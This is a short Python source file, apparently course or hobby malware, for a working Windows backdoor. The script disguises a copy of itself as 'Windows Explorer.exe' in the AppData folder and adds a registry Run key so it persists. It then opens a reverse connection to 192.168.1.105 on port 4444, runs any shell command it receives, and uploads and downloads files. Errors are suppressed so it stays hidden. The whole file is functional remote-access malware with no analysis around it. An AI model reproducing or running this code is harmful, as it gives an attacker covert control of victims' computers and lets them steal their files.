import socket
import  subprocess
import json
import os
import base64
import sys
import shutil

class Backdoor:
	
	def __init__(self,ip,port):
		self.become_persistent()
		self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.connection.connect((ip,port))
	
	def become_persistent(self):
		evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
		if not os.path.exists(evil_file_location):
			shutil.copyfile(sys.executable,evil_file_location)
			subprocess.call('reg add HKCU\software\Microsoft\Windows\CurrentVersion\Run /v System /t REG_SZ /d "' + evil_file_location + '"' )

	def reliable_send(self,data):
		json_data = json.dumps(data)
		self.connection.send(json_data.encode())	
		
	def change_dir(self,path):
		os.chdir(path)
		return "Change dir to " + path	
		
	def reliable_recieve(self):
		json_data = ""
		while True:
			try: 
				json_data = json_data + self.connection.recv(1024).decode()
				return json.loads(json_data)
			except json.decoder.JSONDecodeError:
				continue

	def execute_sys_cmd(self,command):
		return subprocess.check_output(command,shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)

	def read_file(self,path):
		with open(path,"rb") as file:
			data = file.read()
			file.close()
			return base64.b64encode(data)	

	def write_file(self,path,data):
		with open(path,"wb") as file:
			file.write(data)
			file.close()
			return b"[+] File Uploaded"		

	def run(self):
		while True:
			command = self.reliable_recieve()
			
			try:
				if command[0] == "exit":
					self.connection.close()
					sys.exit()
				
				elif command[0] == "cd" and len(command) > 1:
					cmd_result = self.change_dir(command[1]).encode()
				elif command[0] == "download":
					cmd_result = self.read_file(command[1])
				elif command[0] == "upload":
					cmd_result = self.write_file(command[1],base64.b64decode(command[2]))
				else:	
					cmd_result = self.execute_sys_cmd(command)
			except Exception:
				cmd_result = b"[-] Error during command execution"
			
			self.reliable_send(cmd_result.decode())



try:
	backdoor = Backdoor("192.168.1.105",4444)
	backdoor.run()
except Exception:
	sys.exit()